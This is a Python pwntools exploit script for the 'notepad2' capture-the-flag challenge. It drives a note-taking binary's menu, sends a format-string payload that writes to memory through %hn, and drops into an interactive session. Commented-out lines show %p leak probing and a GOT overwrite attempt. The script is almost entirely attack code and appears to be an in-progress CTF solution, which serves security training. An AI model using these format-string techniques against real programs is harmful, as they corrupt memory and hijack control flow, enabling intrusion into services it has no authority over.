#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './notepad2_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc'
libc = ELF(libc, checksec=False)
ld = ELF('./ld', checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'notepad2.ctf.intigriti.io', 1342 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
breakrva 0x15e6
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================
'''
 ---------------------------------
| Symphonie der Entschlossenheit  |
 ---------------------------------
'''
def create(idx, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'>', str(idx).encode())
    io.sendlineafter(b'>', data)

def view(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'>', str(idx).encode())
    
def free(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'>', str(idx).encode())
    

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(elf)
    
    # for i in range(9):
    #     # payload = (f'{i}'.encode())*149
    #     payload = b'|%p'*49
    #     create(i, payload)
    
    # payload = fmtstr_payload(6, elf.got['puts'], write_size='short')
    payload = b'%6175x%6$hn'
    create(0, payload)
    view(0)
    
    # for i in range(9):
    #     free(i)

    io.interactive()
    
if __name__ == '__main__':
    exploit()